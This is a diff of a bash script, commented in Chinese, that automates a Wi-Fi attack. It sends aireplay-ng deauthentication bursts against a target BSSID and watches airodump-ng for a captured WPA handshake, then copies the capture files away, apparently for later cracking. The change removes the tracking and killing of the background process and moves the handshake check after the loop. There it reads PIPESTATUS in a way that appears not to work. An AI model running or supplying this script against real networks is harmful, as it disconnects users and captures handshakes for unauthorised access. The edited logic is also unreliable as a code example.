@@ -70,18 +70,9 @@ while true; do
   
     echo "发送去认证请求..."
     aireplay-ng -0 10 -a $BSSID wlan0mon &
-    AIREPLAY_PID=$!
   
     # 使用 while 循环监控 airodump-ng 进程，检查是否找到握手包
     while ps -p $AIRODUMP_PID > /dev/null; do
-      # 如果 grep 找到了 "WPA handshake"（退出状态为 0），表示找到握手包
-      GREP_EXIT_STATUS=${PIPESTATUS[1]}  # 获取 grep 的退出状态
-      if [ $GREP_EXIT_STATUS -eq 0 ]; then
-        echo "找到 WPA 握手包，继续处理..."
-        FOUND_HANDSHAKE=true
-        break
-      fi
-  
       # 如果没有找到握手包，则每 5 秒发送一次 aireplay-ng 去认证请求
       if [ $ELAPSED_TIME -lt $MAX_WAIT_TIME ]; then
         # 累计时间
@@ -95,12 +86,11 @@ while true; do
       # 每 5 秒休眠一次
       sleep 5
     done
-  
-    kill $AIREPLAY_PID
-  
-    # 如果找到握手包，则保存并退出
-    if [ "$FOUND_HANDSHAKE" = true ]; then
-      # 复制握手包到指定目录
+
+    # 如果 grep 找到了 "WPA handshake"（退出状态为 0），表示找到握手包
+    GREP_EXIT_STATUS=${PIPESTATUS[1]}  # 获取 grep 的退出状态
+    if [ $GREP_EXIT_STATUS -eq 0 ]; then
+      echo "找到 WPA 握手包，继续处理..."
       cp -rf $ESSID-*.cap $HANDSHAKE_DIR/
     else
       echo "没有找到 WPA 握手包，或者发生了错误。"
